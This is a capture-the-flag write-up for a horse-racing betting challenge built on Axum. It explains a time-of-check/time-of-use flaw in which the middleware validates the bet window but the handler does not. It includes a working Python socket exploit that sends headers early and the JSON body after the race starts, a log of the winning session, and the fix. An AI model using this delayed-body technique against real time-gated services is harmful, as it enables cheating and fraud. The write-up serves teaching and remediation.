# Horse Racing: headers before the start, body after the race has begun

[По-русски](solve.ru.md)

## 0. Goal

The player begins with **10 points** and unlocks the VIP flag at **500 points**. There are 16 horses and one possible bet per race. A winning all-in bet doubles the bankroll.

The strong favorite only becomes identifiable after racing starts, when bets should already be closed. The solution is to send HTTP request **headers** before the betting window closes, hold the body, watch the live horse positions, and send the JSON **after** the start.

## 1. What the Axum code does

`src/main.rs` registers `POST /api/bet` with a middleware:

```rust
.route(
    "/api/bet",
    post(bet).route_layer(middleware::from_fn_with_state(
        state.clone(), betting_open
    )),
)
```

The middleware reads the timer before forwarding:

```rust
async fn betting_open(State(state): State<SharedState>,
                      request: Request, next: Next)
    -> Result<Response, (StatusCode, String)> {
    if state.read().await.timer >= 30 {
        return Err((StatusCode::BAD_REQUEST, "Race already started".to_string()));
    }
    Ok(next.run(request).await)
}
```

The final handler extracts `Json<BetRequest>` later, after the middleware has already passed the request. That JSON extractor must await the actual HTTP body. When it finally enters `bet`, the handler checks the amount, index, one-bet rule and points balance **but never checks `timer` again**.

The vulnerability is a time-of-check/time-of-use gap between **request admission** and **handling the complete body**.

## 2. Finding the likely winner after the start

At `timer==30`, the race loop selects a private `favorite` in 0..15. At `timer>30`, each horse advances once per second; the favorite receives twice the ordinary increment:

```rust
let base = rand::random_range(0.0..=3.0);
let speed = if h == state.favorite { base * 2.0 } else { base };
state.horses[h] += speed;
```

The favorite index itself is not exposed, but `GET /api/state` exposes all 16 running positions. The successful run used:

```text
leading position >= 50
leading position - second place >= 10
```

This does **not** mathematically guarantee a winner; it selects a visible, statistically strong leader. The actual six winning races were confirmed by the operator's report.

## 3. Holding a header-only request

A TCP connection begins with a request like:

```http
POST /api/bet HTTP/1.1
Host: <host>
Content-Type: application/json
Content-Length: 80
Connection: close

```

After the blank line, send **nothing more yet**. On a second connection, keep requesting `/api/state`. When the race is well underway and a leader clearly emerges, send exactly 80 bytes on the first connection:

```python
import json

def make_body(horse, stake):
    payload = json.dumps({"horse":horse,"amount":stake},
                         separators=(",",":")).encode()
    assert len(payload) <= 80
    return payload.ljust(80, b" ")
```

The spaces are valid trailing JSON whitespace. The exact `Content-Length` must match the delayed body.

## 4. Minimal protocol reconstruction

This code shows the actual TCP timing mechanism, reconstructed from `main.rs` and the recorded live test. The original socket solver was not in the source ZIP.

```python
import socket, json, time, requests

def late_bet(host, port, stake):
    conn = socket.create_connection((host,port),timeout=10)
    conn.sendall((
        f"POST /api/bet HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: 80\r\n"
        "Connection: close\r\n\r\n"
    ).encode())

    while True:
        state = requests.get(f"http://{host}:{port}/api/state",timeout=5).json()
        p = state["horses"]
        leaders = sorted(range(16), key=lambda i:p[i], reverse=True)
        if state["timer"] >= 30 and p[leaders[0]] >= 50 \
           and p[leaders[0]] - p[leaders[1]] >= 10:
            break
        time.sleep(0.3)

    body = json.dumps({"horse":leaders[0],"amount":stake},
                      separators=(",",":")).encode().ljust(80,b" ")
    conn.sendall(body)
    response = conn.recv(4096)
    conn.close()
    return response
```

A full driver would need to handle the next race, timeouts, bankroll resets and unlucky outcomes. The snippet illustrates the verified primitive only; it is not claimed to be the missing original script.

## 5. Live result

The archived successful-session report records:

1. POST headers passed at `timer<30` while its body was withheld.
2. A separate connection monitored `/api/state` until the leader was >=50 with a >=10 gap.
3. The padded JSON was sent when `timer>=30`.
4. `bet` returned **HTTP 200** during an active race.
5. Six wins changed the points: **10 → 20 → 40 → 80 → 160 → 320 → 640**, around seven minutes.
6. `GET /api/state` revealed the VIP flag above 500 points; the platform accepted it.

The ZIP contains the Rust source and flag-submission evidence, but not the original TCP script.

## 6. Why no lock race or NaN trick was necessary

The task also invited ideas such as lock timing or numeric edge cases. The solution needed neither. It was a **request-body delay** exploiting validation too early in the request pipeline. Fully buffering reverse proxies might change exploitability, but the actual challenge stack admitted the header-only request.

## 7. Correct fix

Check `timer<30` **inside `bet` after JSON deserialization**, under the same write lock used to debit points and record the bet. Admission and state mutation must be one synchronized operation. Middleware is not a substitute for validation at the point of use.


## Rust manifest and local-build boundary

The original [`Cargo.toml`](assets/Cargo.toml) is now archived beside [`main.rs`](assets/main.rs), documenting Axum 0.8, Tokio and Rand dependencies. A full container build also needs the original `Cargo.lock` and binary `static/` resources, which are not included in this text-oriented public archive. Thus these two files are **not** a standalone Docker project, and a local build has not been verified in this audit.
